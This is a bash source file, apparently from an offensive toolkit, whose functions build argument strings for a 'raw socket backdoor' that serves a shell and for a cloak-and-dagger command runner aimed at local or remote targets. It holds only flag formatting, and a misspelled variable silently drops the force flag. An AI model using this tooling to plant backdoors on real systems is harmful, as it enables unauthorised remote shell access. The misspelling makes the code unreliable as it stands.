#!/bin/bash
#
# Regards, the Alveare Solutions society.
#
# FORMATTERS

function format_illusion_of_control_command_string () {
    COMMAND=`format_illusion_of_control_command`
    CLOAK_ORDER=`format_illusion_of_control_cloak_order`
    DAGGER_FILE=`format_illusion_of_control_execute`
    PATH_DIRECTORY=`format_illusion_of_control_path_directory`
    TARGET=`format_illusion_of_control_target`
    PATH_SETUP_FLAG=`format_illusion_of_control_path_setup`
    FORCE_COMMAND_FLAG=`format_illusion_of_control_force_command`
    CONNECTION_TYPE=`format_illusion_of_control_connection_type`
    TIMEOUT_SECONDS=`format_illusion_of_control_wait`
    CONNECTION_DETAILS=`format_illusion_of_control_connection_details`
    TEMPORARY_FILE=`format_illusion_of_control_temporary_file`
    echo "$COMMAND $CLOAK_ORDER $DAGGER_FILE $PATH_DIRECTORY $TARGET "\
        "$PATH_SETUP_FLAG $FORCE_COMMAN_FLAG $CONNECTION_TYPE "\
        "$TIMEOUT_SECONDS $CONNECTION_DETAILS $TEMPORARY_FILE"
    return $?
}

function format_raw_socket_backdoor_command_string () {
    VERBOSITY=`format_raw_socket_backdoor_verbosity`
    RUNNING_MODE=`format_raw_socket_backdoor_running_mode`
    FOREGROUND=`format_raw_socket_backdoor_foreground`
    CNX_LIMIT=`format_raw_socket_backdoor_connection_limit`
    LOG_FILE=`format_raw_socket_backdoor_log_file`
    SHELL_PATH=`format_raw_socket_backdoor_shell_path`
    echo "$RUNNING_MODE $FOREGROUND $VERBOSITY $LOG_FILE "\
        "$SHELL_PATH $CNX_LIMIT"
    return $?
}

function format_illusion_of_control_temporary_file () {
    echo "--temporary-file=${MD_DEFAULT['tmp-file']}"
    return $?
}

function format_illusion_of_control_cloak_order () {
    echo "--order=${MD_DEFAULT['cloak-order']}"
    return $?
}

function format_illusion_of_control_execute () {
    echo -n "--execute=${MD_DEFAULT['dgr-file']}"
    return $?
}

function format_illusion_of_control_path_directory () {
    echo -n "--path=${MD_DEFAULT['path-dir']}"
    return $?
}

function format_illusion_of_control_target () {
    echo -n "--target=${MD_DEFAULT['target']}"
    return $?
}

function format_illusion_of_control_path_setup () {
    case "${MD_DEFAULT['setup-path']}" in
        'on')
            echo -n '--setup-path'
            ;;
        'off')
            echo -n ''
            ;;
        *)
            echo; warning_msg "Invalid IOC path setup flag value"\
                "(${RED}${MD_DEFAULT['setup-path']}${RESET})."
            ;;
    esac
    return $?
}

function format_illusion_of_control_force_command () {
    case "${MD_DEFAULT['force-cmd']}" in
        'on')
            echo -n '--force'
            ;;
        'off')
            echo -n ''
            ;;
        *)
            echo; warning_msg "Invalid IOC force command flag value"\
                "(${RED}${MD_DEFAULT['force-cmd']}${RESET})."
            ;;
    esac
    return $?
}

function format_illusion_of_control_connection_type () {
    case "${MD_DEFAULT['target']}" in
        'local')
            echo -n ''
            ;;
        'remote')
            echo -n "--connection-type=${MD_DEFAULT['conn-type']}"
            ;;
        *)
            echo; warning_msg "Invalid IOC target"\
                "(${RED}${MD_DEFAULT['target']}${RESET})."
            return 1
            ;;
    esac
    return $?
}

function format_illusion_of_control_wait () {
    case "${MD_DEFAULT['target']}" in
        'local')
            echo -n ''
            ;;
        'remote')
            echo -n "--wait=${MD_DEFAULT['conn-timeout']}"
            ;;
        *)
            echo; warning_msg "Invalid IOC target"\
                "(${RED}${MD_DEFAULT['target']}${RESET})."
            return 1
            ;;
    esac
    return $?
}

function format_illusion_of_control_connection_details () {
    case "${MD_DEFAULT['target']}" in
        'local')
            echo -n ''
            ;;
        'remote')
            echo -n "--remote=${MD_DEFAULT['conn-details']}"
            ;;
        *)
            echo; warning_msg "Invalid IOC target"\
                "(${RED}${MD_DEFAULT['target']}${RESET})."
            return 1
            ;;
    esac
    return $?
}

function format_illusion_of_control_command () {
    case "${MD_DEFAULT['command']}" in
        'all')
            echo -n '--all'
            ;;
        *)
            echo -n "--command=${MD_DEFAULT['command']}"
            ;;
    esac
    return $?
}

function format_raw_socket_backdoor_verbosity () {
    case ${MD_DEFAULT['rbd-verbosity']} in
        1)
            echo -n "--verbose"
            ;;
        2)
            echo -n "--vverbose"
            ;;
        3)
            echo -n "--vvverbose"
            ;;
        *)
            echo; error_msg "Invalid raw socket backdoor verbosity level"\
                "(${MD_DEFAULT['rbd-verbosity']})."
            return 1
    esac
    return $?
}

function format_raw_socket_backdoor_running_mode () {
    echo -n "--running-mode=${MD_DEFAULT['rbd-mode']}"
    return $?
}

function format_raw_socket_backdoor_foreground () {
    case "${MD_DEFAULT['rbd-foreground']}" in
        'on')
            echo -n "--foreground"
            ;;
        'off')
            echo -n
            ;;
        *)
            echo; error_msg "Invalid raw socket backdoor foreground flag value"\
                "(${MD_DEFAULT['rbd-foreground']})."
            return 1
            ;;
    esac
    return $?
}

function format_raw_socket_backdoor_connection_limit () {
    echo -n "connection_limit=${MD_DEFAULT['rbd-cnx']}"
    return $?
}

function format_raw_socket_backdoor_log_file () {
    echo -n "--log-file=${MD_DEFAULT['log-file']}"
    return $?
}

function format_raw_socket_backdoor_shell_path () {
    echo -n "--shell=${MD_DEFAULT['rbd-shell']}"
    return $?
}

